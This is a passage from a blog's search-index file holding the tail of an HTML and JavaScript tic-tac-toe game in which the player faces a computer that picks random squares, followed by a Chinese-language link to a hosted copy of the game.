class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div3&quot;&amp;&amp;a[3]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[3]=1;</span><br><span class="line">document.getElementById(&quot;srci3&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div4&quot;&amp;&amp;a[4]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[4]=1;</span><br><span class="line">document.getElementById(&quot;srci4&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div5&quot;&amp;&amp;a[5]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[5]=1;</span><br><span class="line">document.getElementById(&quot;srci5&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div6&quot;&amp;&amp;a[6]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[6]=1;</span><br><span class="line">document.getElementById(&quot;srci6&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div7&quot;&amp;&amp;a[7]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[7]=1;</span><br><span class="line">document.getElementById(&quot;srci7&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div8&quot;&amp;&amp;a[8]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[8]=1;</span><br><span class="line">document.getElementById(&quot;srci8&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!(winner()))&#123;</span><br><span class="line">coun++;</span><br><span class="line">Robots_Time();&#125;</span><br><span class="line"></span><br><span class="line">if(!(winner())&amp;&amp;coun==9)</span><br><span class="line">alert(&quot;draw&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function Robots_Time()</span><br><span class="line">&#123;</span><br><span class="line">var z=1;</span><br><span class="line">while(z==1)&#123;</span><br><span class="line">var ran=Math.random()*9;</span><br><span class="line">ran=parseInt(ran);</span><br><span class="line">if(a[ran]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[ran]=2;</span><br><span class="line">document.getElementById(&quot;srci&quot;+String(ran)).src=&quot;white.png&quot;;</span><br><span class="line">coun++;</span><br><span class="line">z=0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">winner();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function winner()&#123;</span><br><span class="line">if(a[0]==2&amp;&amp;a[1]==2&amp;&amp;a[2]==2||a[0]==2&amp;&amp;a[4]==2&amp;&amp;a[8]==2||a[0]==2&amp;&amp;a[3]==2&amp;&amp;a[6]==2)&#123;</span><br><span class="line">alert(&quot;You failed&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[1]==2&amp;&amp;a[4]==2&amp;&amp;a[7]==2||a[2]==2&amp;&amp;a[5]==2&amp;&amp;a[8]==2||a[3]==2&amp;&amp;a[4]==2&amp;&amp;a[5]==2)&#123;</span><br><span class="line">alert(&quot;You failed&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[2]==2&amp;&amp;a[4]==2&amp;&amp;a[6]==2||a[6]==2&amp;&amp;a[7]==2&amp;&amp;a[8]==2)&#123;</span><br><span class="line">alert(&quot;You failed&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line"></span><br><span class="line">if(a[0]==1&amp;&amp;a[1]==1&amp;&amp;a[2]==1||a[0]==1&amp;&amp;a[4]==1&amp;&amp;a[8]==1||a[0]==1&amp;&amp;a[3]==1&amp;&amp;a[6]==1)&#123;</span><br><span class="line">alert(&quot;You win!&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[1]==1&amp;&amp;a[4]==1&amp;&amp;a[7]==1||a[2]==1&amp;&amp;a[5]==1&amp;&amp;a[8]==1||a[3]==1&amp;&amp;a[4]==1&amp;&amp;a[5]==1)&#123;</span><br><span class="line">alert(&quot;You win!&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[2]==1&amp;&amp;a[4]==1&amp;&amp;a[6]==1||a[6]==1&amp;&amp;a[7]==1&amp;&amp;a[8]==1)&#123;</span><br><span class="line">alert(&quot;You win!&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;table border=&quot;1&quot;</span><br><span class="line">cellpadding=&quot;1&quot;</span><br><span class="line">cellspacing=&quot;1&quot;</span><br><span class="line">align=&quot;center&quot;&gt;</span><br><span class="line">&lt;caption&gt;Play with NPC&lt;audio loop=&quot;loop&quot; autoplay=&quot;autoplay/&quot;&gt;</span><br><span class="line">&lt;source src=&quot;I Need To Be In Love.mp3&quot; type=&quot;audio/mpeg&quot;&gt;&lt;/caption&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div0&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci0&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div1&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci1&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div2&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci2&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div3&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci3&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div4&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci4&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div5&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci5&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div6&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci6&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div7&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci7&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div8&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci8&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;center&gt;&lt;button onclick=&quot;restart()&quot;&gt;重新开始&lt;/button&gt;&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>附地址：<a href="http://139.59.232.52/game.html" target="_blank" rel="noopener">点击与愚蠢的电脑过招井字棋，输了算你牛</a></p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
